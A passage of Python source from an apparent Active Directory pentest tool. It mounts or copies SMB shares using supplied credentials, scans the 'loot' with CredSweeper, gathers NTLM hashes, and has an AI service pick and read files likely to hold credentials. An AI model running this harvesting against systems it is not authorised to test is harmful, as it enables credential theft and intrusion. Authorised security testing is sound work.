                        f"phase={mark_sensitive(phase_label, 'text')} "
                        f"artifact_hits={artifact_hits} "
                        f"loot={mark_sensitive(loot_rel, 'path')} "
                        f"cache={mark_sensitive('reused', 'text')}"
                    )
                    return {
                        "completed": True,
                        "artifact_hits": artifact_hits,
                        "phase": phase,
                        "loot_dir": loot_dir,
                        "cache_reused": True,
                    }
            print_info_debug(
                "Deterministic rclone artifact cache not reused: "
                f"phase={mark_sensitive(phase_label, 'text')} reason={mark_sensitive(cache_reason, 'text')}"
            )
        grouped_remote_paths = share_mapping_service.resolve_candidate_remote_paths_from_aggregate(
            aggregate_map_path=aggregate_map_path,
            hosts=hosts,
            shares=shares,
            extensions=get_sensitive_phase_extensions(phase),
        )
        if cache_enabled:
            shutil.rmtree(loot_dir, ignore_errors=True)
            os.makedirs(loot_dir, exist_ok=True)
        download_result = _run_rclone_copy_mapped_loot_download(
            shell=shell,
            domain=domain,
            username=username,
            password=password,
            grouped_remote_paths=grouped_remote_paths,
            loot_dir=loot_dir,
            manifest_dir=manifest_dir,
            mostly_small_files=False,
            operation_label="deterministic mapped artifact scan",
        )
    else:
        target_pairs = _resolve_cifs_host_share_targets(
            hosts=hosts,
            shares=shares,
            share_map=share_map,
        )
        download_result = _run_rclone_copy_loot_download(
            shell=shell,
            domain=domain,
            username=username,
            password=password,
            target_pairs=target_pairs,
            loot_dir=loot_dir,
            extensions=get_sensitive_phase_extensions(phase),
            mostly_small_files=False,
            operation_label="deterministic artifact scan",
        )
    if not bool(download_result.get("success")):
        return {"completed": False, "artifact_hits": 0, "phase": phase}

    artifact_files = _list_files_under_path(loot_dir)
    spidering_service = shell._get_spidering_service()
    artifact_records: list[ArtifactProcessingRecord] = []
    for file_path in artifact_files:
        artifact_records.append(spidering_service.process_found_file(
            file_path,
            domain,
            "ext",
            source_hosts=hosts,
            source_shares=shares,
            auth_username=username,
            enable_legacy_zip_callbacks=False,
            apply_actions=True,
        ))
    loot_rel = os.path.relpath(loot_dir, shell._get_workspace_cwd())
    if not artifact_files:
        print_info(f"No artifact candidates were detected for phase {phase_label}.")
    else:
        report_path = _persist_artifact_processing_report(
            phase_root_abs=phase_root_abs,
            records=artifact_records,
        )
        _render_artifact_processing_summary(
            shell,
            phase_label=phase_label,
            records=artifact_records,
            report_path=report_path,
        )
        if artifact_records_extracted_nothing(artifact_records):
            render_no_extracted_findings_preview(
                loot_dir=loot_dir,
                loot_rel=loot_rel,
                analyzed_count=len(artifact_files),
                category="artifact",
                phase_label=phase_label,
                preview_limit=5,
            )
    print_info(
        "Deterministic rclone artifact summary: "
        f"phase={mark_sensitive(phase_label, 'text')} "
        f"artifact_hits={len(artifact_files)} "
        f"loot={mark_sensitive(loot_rel, 'path')}"
    )
    if cache_enabled and cache_entries:
        cache_service.write_cache_manifest(
            manifest_path=cache_paths["manifest_path"],
            phase=phase,
            signature=cache_signature,
            candidate_files=len(artifact_files),
            extra={
                "artifact_hits": len(artifact_files),
                "artifact_records": cache_service.serialize_artifact_records(artifact_records),
            },
        )
    return {
        "completed": True,
        "artifact_hits": len(artifact_files),
        "phase": phase,
        "loot_dir": loot_dir,
        "cache_reused": False,
    }


def _run_post_mapping_deterministic_cifs_credsweeper_scan(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    hosts: list[str],
    share_map: dict[str, dict[str, str]] | None = None,
    username: str,
    password: str,
    cifs_mount_root: str | None = None,
    profile: str = DEFAULT_SMB_SENSITIVE_FILE_PROFILE,
    phase: str = SMB_SENSITIVE_SCAN_PHASE_TEXT_CREDENTIALS,
    analysis_context: dict[str, Any] | None = None,
) -> dict[str, Any]:
    """Run deterministic CIFS-mounted share analysis with CredSweeper."""
    from adscan_internal.services.cifs_credsweeper_scan_service import (
        CIFSCredSweeperScanService,
    )
    from adscan_internal.services.credsweeper_service import CredSweeperService

    credsweeper_path = str(getattr(shell, "credsweeper_path", "") or "").strip()
    if not credsweeper_path:
        print_warning(
            "Deterministic CIFS share analysis is unavailable because "
            "CredSweeper is not configured."
        )
        return {"completed": False, "credential_findings": 0, "phase": phase}

    effective_mount_root = str(
        cifs_mount_root or ""
    ).strip() or _resolve_cifs_mount_root(
        shell=shell,
        domain=domain,
    )
    marked_mount_root = mark_sensitive(effective_mount_root, "path")
    mount_targets = _resolve_cifs_host_share_targets(
        hosts=hosts,
        shares=shares,
        share_map=share_map,
    )
    mounted_points: list[str] = []
    try:
        mounted_points = _mount_cifs_targets_via_host_helper(
            domain=domain,
            username=username,
            password=password,
            mount_root=effective_mount_root,
            targets=mount_targets,
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_warning_debug(
            "CIFS mount orchestration for deterministic scan failed unexpectedly."
        )
        print_warning_debug(
            f"CIFS deterministic mount exception: {type(exc).__name__}: {exc}"
        )
        print_warning_debug(traceback.format_exc())

    if not os.path.isdir(effective_mount_root):
        print_warning(
            "CIFS deterministic analysis root is not accessible. "
            f"Expected mounted content at {marked_mount_root}."
        )
        _unmount_cifs_targets_via_host_helper(mount_points=mounted_points)
        return {"completed": False, "credential_findings": 0, "phase": phase}

    marked_domain = mark_sensitive(domain, "domain")
    marked_user = mark_sensitive(username or "unknown", "user")
    analysis_context = analysis_context or {}
    ai_history_path = _resolve_smb_loot_ai_history_path(
        shell,
        domain=domain,
        username=username,
        phase=phase,
        backend="cifs",
    )
    print_info(
        "Running deterministic share analysis "
        f"({get_sensitive_phase_definition(phase).get('label', 'CIFS + CredSweeper')}) "
        f"for domain {marked_domain} as {marked_user}."
    )

    credsweeper_service = (
        shell._get_credsweeper_service()
        if callable(getattr(shell, "_get_credsweeper_service", None))
        else CredSweeperService(shell.run_command)
    )
    scan_service = CIFSCredSweeperScanService()
    artifacts_dir = _resolve_credsweeper_artifacts_dir(
        shell=shell,
        domain=domain,
        purpose="cifs_deterministic",
    )
    try:
        scan_result = scan_service.scan_mounted_shares(
            mount_root=effective_mount_root,
            hosts=hosts,
            shares=shares,
            credsweeper_service=credsweeper_service,
            credsweeper_path=credsweeper_path,
            json_output_dir=artifacts_dir,
            profile=profile,
        )

        print_info(
            "Deterministic CIFS scan summary: "
            f"mapped_shares={scan_result.mapped_shares} "
            f"candidate_files={scan_result.candidate_files} "
            f"scanned_files={scan_result.scanned_files} "
            f"files_with_findings={scan_result.files_with_findings} "
            f"credential_like_findings={scan_result.total_findings}"
        )

        structured_stats = shell._get_spidering_service().process_local_structured_files(
            root_path=effective_mount_root,
            phase=phase,
            domain=domain,
            source_hosts=hosts,
            source_shares=shares,
            auth_username=username,
            apply_actions=True,
        )
        structured_files_with_findings = int(
            structured_stats.get("files_with_findings", 0) or 0
        )
        ntlm_hash_findings = structured_stats.get("ntlm_hash_findings")
        if isinstance(ntlm_hash_findings, list) and ntlm_hash_findings:
            loot_rel = os.path.relpath(effective_mount_root, shell._get_workspace_cwd())
            render_ntlm_hash_findings_flow(
                shell,
                domain=domain,
                loot_dir=effective_mount_root,
                loot_rel=loot_rel,
                phase_label=str(get_sensitive_phase_definition(phase).get("label", phase)),
                ntlm_hash_findings=[
                    item for item in ntlm_hash_findings if isinstance(item, dict)
                ],
                source_scope=(
                    "SMB file NTLM hash findings from "
                    f"{str(get_sensitive_phase_definition(phase).get('label', phase))}"
                ),
                fallback_source_hosts=hosts,
                fallback_source_shares=shares,
            )
        analysis_result = run_loot_credential_analysis(
            shell,
            domain=domain,
            loot_dir=effective_mount_root,
            phase=phase,
            phase_label=str(get_sensitive_phase_definition(phase).get("label", phase)),
            candidate_files=int(scan_result.candidate_files),
            analysis_context=analysis_context,
            ai_history_path=ai_history_path,
            credsweeper_path=credsweeper_path,
            credsweeper_output_dir=artifacts_dir,
            jobs=get_default_credsweeper_jobs(),
            credsweeper_findings=dict(scan_result.findings),
        )
        combined_findings = dict(analysis_result.findings)
        ai_findings = list(analysis_result.ai_findings)
        ai_attempted = analysis_result.ai_attempted
        ai_success = analysis_result.ai_success
        if ai_attempted:
            analysis_context["ai_attempted"] = True
            analysis_context["ai_success"] = ai_success
        total_ai_findings, ai_files_with_findings = _count_grouped_credential_findings(
            combined_findings
        )
        if combined_findings:
            shell.handle_found_credentials(
                combined_findings,
                domain,
                source_hosts=hosts,
                source_shares=shares,
                auth_username=username,
                source_artifact="CIFS mounted share scan",
                analysis_origin=(
                    "mixed"
                    if analysis_result.analysis_engine == _SMB_LOOT_ANALYSIS_ENGINE_BOTH
                    else ("ai" if analysis_result.analysis_engine == _SMB_LOOT_ANALYSIS_ENGINE_AI else "credsweeper")
                ),
                ai_findings=ai_findings,
            )
        elif structured_files_with_findings == 0:
            loot_rel = os.path.relpath(effective_mount_root, shell._get_workspace_cwd())
            _print_analyzed_no_findings_preview(
                loot_dir=effective_mount_root,
                loot_rel=loot_rel,
                candidate_files=int(scan_result.candidate_files),
                phase_label=str(get_sensitive_phase_definition(phase).get("label", phase)),
                preview_limit=5,
            )
        return {
            "completed": True,
            "credential_findings": int(total_ai_findings),
            "files_with_findings": int(int(ai_files_with_findings) + structured_files_with_findings),
            "candidate_files": int(scan_result.candidate_files),
            "phase": phase,
            "ai_attempted": ai_attempted,
            "ai_success": ai_success,
        }
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_warning("CIFS deterministic share analysis failed unexpectedly.")
        print_warning_debug(
            f"CIFS deterministic scan exception: {type(exc).__name__}: {exc}"
        )
        print_warning_debug(traceback.format_exc())
        return {"completed": False, "credential_findings": 0, "phase": phase}
    finally:
        try:
            _unmount_cifs_targets_via_host_helper(mount_points=mounted_points)
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_warning_debug(
                "CIFS unmount cleanup failed unexpectedly after deterministic scan."
            )
            print_warning_debug(
                f"CIFS deterministic unmount exception: {type(exc).__name__}: {exc}"
            )


def _run_post_mapping_deterministic_cifs_artifact_scan(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    hosts: list[str],
    share_map: dict[str, dict[str, str]] | None = None,
    username: str,
    password: str,
    cifs_mount_root: str | None = None,
    phase: str,
) -> dict[str, Any]:
    """Run one local CIFS-backed artifact phase using the shared spidering service."""
    phase_root_abs = domain_path(
        getattr(shell, "domains_dir", None),
        domain,
        "smb",
        "cifs",
        "deterministic",
        phase,
    )
    os.makedirs(phase_root_abs, exist_ok=True)
    effective_mount_root = str(
        cifs_mount_root or ""
    ).strip() or _resolve_cifs_mount_root(
        shell=shell,
        domain=domain,
    )
    marked_mount_root = mark_sensitive(effective_mount_root, "path")
    mount_targets = _resolve_cifs_host_share_targets(
        hosts=hosts,
        shares=shares,
        share_map=share_map,
    )
    mounted_points: list[str] = []
    try:
        mounted_points = _mount_cifs_targets_via_host_helper(
            domain=domain,
            username=username,
            password=password,
            mount_root=effective_mount_root,
            targets=mount_targets,
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_warning_debug(
            f"CIFS artifact phase mount exception: {type(exc).__name__}: {exc}"
        )

    if not os.path.isdir(effective_mount_root):
        print_warning(
            "CIFS artifact analysis root is not accessible. "
            f"Expected mounted content at {marked_mount_root}."
        )
        _unmount_cifs_targets_via_host_helper(mount_points=mounted_points)
        return {"completed": False, "artifact_hits": 0, "phase": phase}

    phase_label = str(get_sensitive_phase_definition(phase).get("label", phase))
    print_info(
        f"Running deterministic share analysis ({phase_label}) "
        f"from mounted CIFS content at {marked_mount_root}."
    )

    artifact_hits = 0
    artifact_records: list[ArtifactProcessingRecord] = []
    try:
        spidering_service = shell._get_spidering_service()
        for file_path in _iter_cifs_phase_candidate_files(
            mount_root=effective_mount_root,
            hosts=hosts,
            shares=shares,
            phase=phase,
            aggregate_map_path=_resolve_cifs_aggregate_map_path(
                shell=shell,
                domain=domain,
            ),
        ):
            artifact_hits += 1
            artifact_records.append(spidering_service.process_found_file(
                file_path,
                domain,
                "ext",
                source_hosts=hosts,
                source_shares=shares,
                auth_username=username,
                enable_legacy_zip_callbacks=False,
            ))
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_warning("CIFS artifact phase failed unexpectedly.")
        print_warning_debug(
            f"CIFS artifact phase exception: {type(exc).__name__}: {exc}"
        )
        print_warning_debug(traceback.format_exc())
        return {"completed": False, "artifact_hits": artifact_hits, "phase": phase}
    finally:
        try:
            _unmount_cifs_targets_via_host_helper(mount_points=mounted_points)
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_warning_debug(
                f"CIFS artifact phase unmount exception: {type(exc).__name__}: {exc}"
            )

    if artifact_hits == 0:
        print_info(f"No artifact candidates were detected for phase {phase_label}.")
    else:
        report_path = _persist_artifact_processing_report(
            phase_root_abs=phase_root_abs,
            records=artifact_records,
        )
        _render_artifact_processing_summary(
            shell,
            phase_label=phase_label,
            records=artifact_records,
            report_path=report_path,
        )
        if artifact_records_extracted_nothing(artifact_records):
            render_no_extracted_findings_preview(
                loot_dir=effective_mount_root,
                loot_rel=os.path.relpath(effective_mount_root, shell._get_workspace_cwd()),
                analyzed_count=artifact_hits,
                category="artifact",
                phase_label=phase_label,
                preview_limit=5,
            )
    return {"completed": True, "artifact_hits": artifact_hits, "phase": phase}


def _iter_cifs_phase_candidate_files(
    *,
    mount_root: str,
    hosts: list[str],
    shares: list[str],
    phase: str,
    aggregate_map_path: str | None = None,
) -> list[str]:
    """Return local CIFS-backed files matching one artifact phase."""
    return _iter_cifs_extension_candidate_files(
        mount_root=mount_root,
        hosts=hosts,
        shares=shares,
        extensions=get_sensitive_phase_extensions(phase),
        aggregate_map_path=aggregate_map_path,
        max_file_size_bytes=get_sensitive_phase_max_file_size_bytes(phase),
    )


def _iter_cifs_extension_candidate_files(
    *,
    mount_root: str,
    hosts: list[str],
    shares: list[str],
    extensions: tuple[str, ...],
    aggregate_map_path: str | None = None,
    max_file_size_bytes: int | None = None,
) -> list[str]:
    """Return local CIFS-backed files matching one extension set."""
    from adscan_internal.services.cifs_share_mapping_service import CIFSShareMappingService

    mapping_service = CIFSShareMappingService()
    mount_root_path = Path(mount_root).expanduser().resolve(strict=False)
    suffixes = {ext.casefold() for ext in extensions}
    if not suffixes:
        return []

    unique_hosts = list(dict.fromkeys(str(host).strip() for host in hosts if str(host).strip()))
    unique_shares = list(dict.fromkeys(str(share).strip() for share in shares if str(share).strip()))
    allow_share_fallback = len(unique_hosts) <= 1
    if aggregate_map_path:
        mapped_candidates = mapping_service.resolve_candidate_local_paths_from_aggregate(
            aggregate_map_path=aggregate_map_path,
            mount_root=str(mount_root_path),
            hosts=unique_hosts,
            shares=unique_shares,
            extensions=tuple(suffixes),
            max_file_size_bytes=max_file_size_bytes,
        )
        if mapped_candidates:
            return mapped_candidates

    candidates: list[str] = []
    for host in unique_hosts:
        for share in unique_shares:
            share_root = mapping_service.resolve_share_mount_path(
                mount_root=mount_root_path,
                host=host,
                share=share,
                allow_share_root_fallback=allow_share_fallback,
            )
            if share_root is None:
                continue
            for dirpath, dirnames, filenames in os.walk(share_root):
                prune_excluded_walk_dirs(dirnames)
                for filename in sorted(filenames):
                    file_path = Path(dirpath) / filename
                    try:
                        relative_path = file_path.relative_to(share_root).as_posix()
                    except ValueError:
                        continue
                    if is_globally_excluded_smb_relative_path(relative_path):
                        continue
                    if resolve_effective_sensitive_extension(
                        str(file_path),
                        allowed_extensions=tuple(suffixes),
                    ) not in suffixes:
                        continue
                    if (
                        isinstance(max_file_size_bytes, int)
                        and max_file_size_bytes > 0
                    ):
                        try:
                            if int(file_path.stat().st_size) > max_file_size_bytes:
                                continue
                        except OSError:
                            continue
                    candidates.append(str(file_path))
    return candidates


def _select_post_mapping_sensitive_data_method(
    *,
    shell: Any,
    ai_configured: bool,
    domain: str | None = None,
    username: str | None = None,
    password: str | None = None,
) -> str | None:
    """Select sensitive-data analysis mode for SMB share workflows.

    Acquisition backend UX stays hidden here. We only ask whether the user
    wants to search share loot at all; the credential analysis engine is
    selected later, after loot is available locally.
    """
    if getattr(shell, "auto", False):
        selected = _resolve_default_deterministic_share_analysis_method(
            shell,
            domain=domain,
            username=username,
            password=password,
        )
        return _normalize_sensitive_data_method_for_smb_auth(
            shell,
            domain=domain,
            username=username,
            selected_method=selected,
        )
    selector = getattr(shell, "_questionary_select", None)
    if not callable(selector):
        print_info_debug(
            "Post-mapping selector unavailable; defaulting to deterministic share analysis."
        )
        return _select_deterministic_share_analysis_method(
            shell,
            domain=domain,
            username=username,
            password=password,
        )

    primary_options = [
        "Search for credentials in share loot",
        "Skip sensitive-data analysis",
    ]
    primary_idx = selector(
        "Search for credentials in SMB shares?",
        primary_options,
        default_idx=0,
    )
    if primary_idx == 1:
        return None
    return _select_deterministic_share_analysis_method(
        shell,
        domain=domain,
        username=username,
        password=password,
    )


def _select_deterministic_share_analysis_method(
    shell: Any,
    *,
    domain: str | None = None,
    username: str | None = None,
    password: str | None = None,
) -> str | None:
    """Resolve deterministic SMB share analysis backend without prompting."""
    selected_method = _resolve_default_deterministic_share_analysis_method(
        shell,
        domain=domain,
        username=username,
        password=password,
    )
    selected_method = _normalize_sensitive_data_method_for_smb_auth(
        shell,
        domain=domain,
        username=username,
        password=password,
        selected_method=selected_method,
    )
    workspace_type = str(getattr(shell, "type", "") or "").strip().lower() or "unknown"
    print_info_debug(
        "Deterministic SMB backend selected automatically: "
        f"workspace_type={workspace_type} method={selected_method}"
    )
    return selected_method


def _run_post_mapping_ai_triage(
    shell: Any,
    *,
    domain: str,
    aggregate_map_abs: str,
    aggregate_map_rel: str,
    triage_username: str | None = None,
    triage_password: str | None = None,
    read_backend: str = "smb_impacket",
    cifs_mount_root: str | None = None,
) -> bool:
    """Run AI triage on consolidated share mapping JSON after spider_plus."""
    from adscan_internal.services.share_map_ai_triage_service import (
        ShareMapAITriageService,
    )

    ai_service = shell._get_ai_service()
    if ai_service is None:
        print_info_debug("AI triage skipped: AI service is unavailable.")
        return False

    scope = _select_post_mapping_ai_scope(shell)
    if scope is None:
        print_info("AI triage skipped by user.")
        return True

    triage_service = ShareMapAITriageService()
    try:
        mapping_json = triage_service.load_full_mapping_json(
            aggregate_map_path=aggregate_map_abs
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        marked_map = mark_sensitive(aggregate_map_rel, "path")
        print_warning(
            f"AI triage skipped: could not load consolidated mapping from {marked_map}."
        )
        print_warning_debug(f"AI triage map load failure: {type(exc).__name__}: {exc}")
        return False

    active_username = ""
    if hasattr(shell, "domains_data") and isinstance(
        getattr(shell, "domains_data", None), dict
    ):
        domain_data = shell.domains_data.get(domain, {})
        if isinstance(domain_data, dict):
            active_username = str(domain_data.get("username", "")).strip()

    explicit_username = str(triage_username or "").strip()
    explicit_password = (
        str(triage_password).strip() if triage_password is not None else None
    )
    effective_username = explicit_username or active_username
    effective_password = explicit_password or ""
    is_guest_user = effective_username.lower() in {"guest", "anonymous"}
    principal_key, allowed_share_pairs = (
        triage_service.resolve_principal_allowed_shares(
            mapping_json=mapping_json,
            domain=domain,
            username=effective_username,
        )
    )
    if principal_key and allowed_share_pairs:
        total_before_scope = triage_service.count_total_file_entries(
            mapping_json=mapping_json
        )
        scoped_mapping_json = triage_service.filter_mapping_json_by_allowed_shares(
            mapping_json=mapping_json,
            allowed_share_pairs=allowed_share_pairs,
        )
        total_after_scope = triage_service.count_total_file_entries(
            mapping_json=scoped_mapping_json
        )
        mapping_json = scoped_mapping_json
        marked_principal = mark_sensitive(principal_key, "user")
        print_info_debug(
            "AI triage principal scope applied: "
            f"principal={marked_principal} "
            f"allowed_host_shares={len(allowed_share_pairs)} "
            f"files_before={total_before_scope} files_after={total_after_scope}"
        )
    elif principal_key:
        marked_principal = mark_sensitive(principal_key, "user")
        print_info_debug(
            "AI triage principal scope resolved but no READ share permissions found: "
            f"principal={marked_principal}"
        )
    elif effective_username:
        requested_principal = mark_sensitive(f"{domain}\\{effective_username}", "user")
        print_info_debug(
            "AI triage principal scope not found in share map; using full mapping: "
            f"principal={requested_principal}"
        )

    read_username = effective_username or None
    if effective_username and is_guest_user:
        read_username = resolve_smb_guest_username(shell=shell, domain=domain)

    if effective_username and effective_password:
        marked_user = mark_sensitive(effective_username, "user")
        marked_domain = mark_sensitive(domain, "domain")
        print_info_debug(
            "AI triage byte-read auth source: "
            f"user={marked_user} domain={marked_domain} source=spider_plus_run"
        )
    elif effective_username and is_guest_user:
        marked_user = mark_sensitive(effective_username, "user")
        marked_transport_user = mark_sensitive(read_username or "", "user")
        marked_domain = mark_sensitive(domain, "domain")
        print_info_debug(
            "AI triage byte-read auth source: "
            f"user={marked_user} domain={marked_domain} source=guest_session"
        )
        print_info_debug(
            "AI triage guest transport principal resolved: "
            f"logical_user={marked_user} transport_user={marked_transport_user}"
        )
    elif active_username:
        marked_user = mark_sensitive(active_username, "user")
        marked_domain = mark_sensitive(domain, "domain")
        print_info_debug(
            "AI triage byte-read auth source: "
            f"user={marked_user} domain={marked_domain} source=active_domain_context"
        )
    if read_backend == "cifs_local":
        resolved_root = str(cifs_mount_root or "").strip() or _resolve_cifs_mount_root(
            shell=shell,
            domain=domain,
        )
        marked_root = mark_sensitive(resolved_root, "path")
        print_info_debug(
            "AI triage read backend selected: backend=cifs_local "
            f"mount_root={marked_root}"
        )

    print_info_debug(
        f"AI triage share-map context loaded: scope={scope} chars={len(mapping_json)}"
    )
    total_files = triage_service.count_total_file_entries(mapping_json=mapping_json)
    max_prompt_chars = _resolve_ai_triage_max_prompt_chars()
    try:
        prompt_chunks = triage_service.build_triage_prompt_chunks(
            domain=domain,
            search_scope=scope,
            mapping_json=mapping_json,
            max_prompt_chars=max_prompt_chars,
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_warning(
            "AI triage skipped: could not prepare a bounded share-map view for the model."
        )
        print_warning_debug(
            "AI triage preflight failure: "
            f"{type(exc).__name__}: {exc}"
        )
        return False
    filtered_files = sum(chunk.file_entries for chunk in prompt_chunks)
    filtered_host_shares = sum(chunk.host_shares for chunk in prompt_chunks)
    print_info_debug(
        "AI triage preflight summary: "
        f"total_files={total_files} filtered_files={filtered_files} "
        f"chunks={len(prompt_chunks)} filtered_host_shares={filtered_host_shares} "
        f"max_prompt_chars={max_prompt_chars}"
    )
    if len(prompt_chunks) > 1:
        print_warning(
            "AI triage context exceeded the one-shot model budget. "
            f"Splitting the share map into {len(prompt_chunks)} filtered chunks."
        )
    print_info("Running AI triage on consolidated SMB share mapping...")
    prioritized_files: list[Any] = []
    seen_prioritized_keys: set[tuple[str, str, str]] = set()
    parse_statuses: list[str] = []
    triage_notes: list[str] = []
    stop_reasons: list[str] = []
    payload_present = False
    raw_priority_items = 0
    valid_priority_items = 0
    for chunk_index, chunk in enumerate(prompt_chunks, start=1):
        print_info_debug(
            "AI triage chunk dispatch: "
            f"index={chunk_index}/{len(prompt_chunks)} "
            f"label={chunk.chunk_label} file_entries={chunk.file_entries} "
            f"host_shares={chunk.host_shares} prompt_chars={chunk.prompt_chars}"
        )
        prompt = triage_service.build_triage_prompt(
            domain=domain,
            search_scope=scope,
            mapping_json=chunk.mapping_json,
        )
        response = ai_service.ask_once(prompt, allow_cli_actions=False)
        metadata = getattr(ai_service, "last_response_metadata", {}) or {}
        prompt_est_tokens = metadata.get("request_prompt_estimated_tokens")
        if isinstance(prompt_est_tokens, int):
            print_info_debug(
                "AI triage prompt estimated tokens="
                f"{prompt_est_tokens} for scope={scope} chunk={chunk.chunk_label}."
            )
            if prompt_est_tokens >= 70000:
                print_warning(
                    "AI triage context is very large and model output quality may degrade "
                    "(for example, malformed or empty JSON responses)."
                )
        triage_parse = triage_service.parse_triage_response(response_text=response)
        parse_statuses.append(triage_parse.parse_status)
        payload_present = payload_present or triage_parse.payload_present
        raw_priority_items += triage_parse.raw_priority_items
        valid_priority_items += triage_parse.valid_priority_items
        if triage_parse.stop_reason:
            stop_reasons.append(triage_parse.stop_reason)
        triage_notes.extend(triage_parse.notes)
        for candidate in triage_parse.prioritized_files:
            key = (
                str(candidate.host).strip().lower(),
                str(candidate.share).strip().lower(),
                str(candidate.path).strip().lower(),
            )
            if key in seen_prioritized_keys:
                continue
            seen_prioritized_keys.add(key)
            prioritized_files.append(candidate)

    size_index = triage_service.build_file_size_index(mapping_json=mapping_json)
    if allowed_share_pairs:
        before_count = len(prioritized_files)
        prioritized_files = triage_service.filter_priority_files_by_allowed_shares(
            prioritized_files=prioritized_files,
            allowed_share_pairs=allowed_share_pairs,
        )
        dropped = before_count - len(prioritized_files)
        if dropped > 0:
            print_info_debug(
                "AI prioritized files filtered by principal share permissions: "
                f"dropped={dropped} kept={len(prioritized_files)}"
            )
    _render_ai_triage_prioritization_summary(
        shell,
        prioritized_files=prioritized_files,
        total_files=total_files,
    )

    if not prioritized_files:
        print_warning(
            "AI triage did not return a valid priority_files list. "
            "Skipping per-file analysis."
        )
        print_info_debug(
            "AI triage parse diagnostics: "
            f"status={','.join(parse_statuses) or 'none'} "
            f"payload_present={payload_present} "
            f"raw_priority_items={raw_priority_items} "
            f"valid_priority_items={valid_priority_items}"
        )
        for stop_reason in stop_reasons:
            marked_stop_reason = mark_sensitive(stop_reason, "text")
            print_info_debug(f"AI triage stop_reason: {marked_stop_reason}")
        for note in triage_notes:
            marked_note = mark_sensitive(note, "text")
            print_info_debug(f"AI triage note: {marked_note}")
        return False

    read_mode_label = (
        "local CIFS reads"
        if read_backend == "cifs_local"
        else "Impacket byte-stream reads"
    )
    if not Confirm.ask(
        f"Do you want AI to inspect these prioritized files using {read_mode_label}?",
        default=True,
    ):
        print_info("AI prioritized file inspection cancelled by user.")
        return True

    _run_ai_prioritized_file_analysis(
        shell,
        domain=domain,
        scope=scope,
        triage_service=triage_service,
        ai_service=ai_service,
        prioritized_files=prioritized_files,
        size_index=size_index,
        read_username=read_username,
        read_password=explicit_password if effective_username else None,
        read_domain=domain if effective_username else None,
        read_backend=read_backend,
        cifs_mount_root=cifs_mount_root,
        report_root_abs=os.path.join(os.path.dirname(aggregate_map_abs), "ai_prioritized"),
    )
    return True


def _render_ai_triage_prioritization_summary(
    shell: Any,
    *,
    prioritized_files: list[Any],
    total_files: int,
) -> None:
    """Render AI prioritization summary after share-map triage."""
    selected = len(prioritized_files)
    print_info(
        f"AI triage selected {selected} prioritized file(s) out of {total_files} "
        "total mapped file(s)."
    )
    if not prioritized_files:
        return

    table = Table(
        title="[bold cyan]AI Prioritized SMB Files[/bold cyan]",
        header_style="bold magenta",
        box=rich.box.SIMPLE_HEAVY,
    )
    table.add_column("#", style="cyan", justify="right")
    table.add_column("Host", style="cyan")
    table.add_column("Share", style="magenta")
    table.add_column("Path", style="yellow")
    table.add_column("Why", style="green")

    for idx, candidate in enumerate(prioritized_files, start=1):
        host = mark_sensitive(str(getattr(candidate, "host", "")), "hostname")
        share = mark_sensitive(str(getattr(candidate, "share", "")), "service")
        path = mark_sensitive(str(getattr(candidate, "path", "")), "path")
        why = str(getattr(candidate, "why", "") or "").strip()
        if len(why) > 120:
            why = why[:117] + "..."
        table.add_row(str(idx), host, share, path, why or "-")

    print_panel_with_table(table, border_style=BRAND_COLORS["info"])


def _run_ai_prioritized_file_analysis(
    shell: Any,
    *,
    domain: str,
    scope: str,
    triage_service: Any,
    ai_service: Any,
    prioritized_files: list[Any],
    size_index: dict[tuple[str, str, str], Any],
    read_username: str | None = None,
    read_password: str | None = None,
    read_domain: str | None = None,
    read_backend: str = "smb_impacket",
    cifs_mount_root: str | None = None,
    report_root_abs: str | None = None,
) -> None:
    """Analyze prioritized SMB files with AI using configured file-read backend."""
    from adscan_internal.services.cifs_share_mapping_service import (
        CIFSShareMappingService,
    )
    from adscan_internal.services.file_byte_reader_service import (
        LocalFileByteReaderService,
        SMBFileByteReaderService,
    )
    from adscan_internal.services.share_file_analysis_pipeline_service import (
        ShareFileAnalysisPipelineService,
    )
    from adscan_internal.services.share_file_analyzer_service import (
        ShareFileAnalyzerService,
    )
    from adscan_internal.services.share_file_content_extraction_service import (
        ShareFileContentExtractionService,
    )
    from adscan_internal.services.share_credential_provenance_service import (
        ShareCredentialProvenanceService,
    )

    reader_service = SMBFileByteReaderService()
    local_reader_service = LocalFileByteReaderService()
    cifs_mapping_service = CIFSShareMappingService()
    provenance_service = ShareCredentialProvenanceService()
    pipeline_service = ShareFileAnalysisPipelineService(
        analyzer_service=ShareFileAnalyzerService(
            command_executor=getattr(shell, "run_command", None),
            pypykatz_path=getattr(shell, "pypykatz_path", None),
        ),
        extraction_service=ShareFileContentExtractionService(),
    )
    max_bytes = _resolve_ai_file_read_max_bytes()
    read_failures = 0
    analyzed = 0
    deterministic_handled = 0
    deterministic_findings = 0
    flagged_files = 0
    flagged_credentials = 0
    skipped_oversized = 0
    forced_oversized = 0
    oversized_rows: list[tuple[str, str, str, str, str]] = []
    review_candidate_paths: list[str] = []
    continue_after_findings: bool | None = None
    local_reads = 0
    local_to_smb_fallbacks = 0

    for idx, candidate in enumerate(prioritized_files, start=1):
        host = str(getattr(candidate, "host", "")).strip()
        share = str(getattr(candidate, "share", "")).strip()
        path = str(getattr(candidate, "path", "")).strip()
        is_zip_candidate = _is_zip_path(path)
        if not host or not share or not path:
            read_failures += 1
            print_warning_debug(
                "Skipping invalid prioritized file candidate: "
                f"host={host!r} share={share!r} path={path!r}"
            )
            continue

        size_key = (host.lower(), share.lower(), path.lower())
        size_info = size_index.get(size_key)
        known_size_bytes = getattr(size_info, "size_bytes", None)
        known_size_text = str(getattr(size_info, "size_text", "") or "").strip()
        per_file_max_bytes = max_bytes
        full_zip_limit = _resolve_ai_zip_full_read_max_bytes()
        if isinstance(known_size_bytes, int) and known_size_bytes > max_bytes:
            marked_path = mark_sensitive(path, "path")
            marked_host = mark_sensitive(host, "hostname")
